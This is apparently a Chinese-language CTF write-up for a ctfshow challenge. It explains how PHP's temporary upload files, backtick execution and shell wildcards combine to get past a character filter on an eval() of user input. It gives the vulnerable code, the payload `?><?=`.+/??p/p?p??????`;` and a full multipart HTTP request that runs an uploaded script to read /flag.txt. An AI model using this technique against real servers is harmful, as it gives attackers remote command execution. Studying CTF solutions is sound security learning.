---
title: "PHP上传机制执行命令"
date: 2026-07-02
---
# PHP 上传机制执行命令

例题 ctfshow 红包题第二弹
只有`p` `.` `\` `=` `<` `>` `?` 和`反引号`没有被屏蔽

```php
<?php
        if(isset($_GET['cmd'])){
            $cmd=$_GET['cmd'];
            highlight_file(__FILE__);
            if(preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){
            
                die("cerror");
            }
            if(preg_match("/\~|\!|\@|\#|\%|\^|\&|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/",$cmd)){
                die("serror");
            }
            eval($cmd);
        
        }
    
     ?>
```

## PHP 上传机制

在`php`中，使用`Content-Type: multipart/form-data;`上传文件时，会将它保存在临时文件中，在`php`的配置中`upload_tmp_dir`参数为保存临时文件的路经，linux 下面默认为`/tmp`。

也就是说只要 php 接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。

并且 php 每次创建的临时文件名都有固定的格式，为`phpXXXX.tmp`（Windows 中）、`php**.tmp`（Linux 中）。

## PHP 中反引号作用

在 php 里面反引号里面的内容会被当做 shell 命令被执行。例如

```php
<?php echo`whoami`; ?>
```

会直接当作命令执行

## 其他小知识

1. `.`号相当于`source`命令，这个命令可以直接把文件内容当作命令执行，相当于把文件直接当作`shell`脚本执行

2. `<?=`相当于`<?php ehco`的简写版

3. `?`相当于字符的通配符

## payload 构造

```php
/?cmd=?><?=`.+/??p/p?p??????`;
```

`?>`：闭合前面的<?php 命令

`<?=`：相当于<?php echo

`反引号`:执行命令

`.`相当于source命令

`+`：相当于空格

`?`：文字通配符，负责执行上传的临时文件

## 构造数据包

```http
POST /?cmd=?><?=`.+/??p/p?p??????`; HTTP/1.1
Host: 25e3ffb8-22fe-4791-be5f-e11f6e669270.challenge.ctf.show
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888
Content-Length: 248


-----------------------------10242300956292313528205888
Content-Disposition: form-data; name="fileUpload"; filename="1.txt"
Content-Type: text/plain


#! /bin/bash


cat /flag.txt
-----------------------------10242300956292313528205888--
```
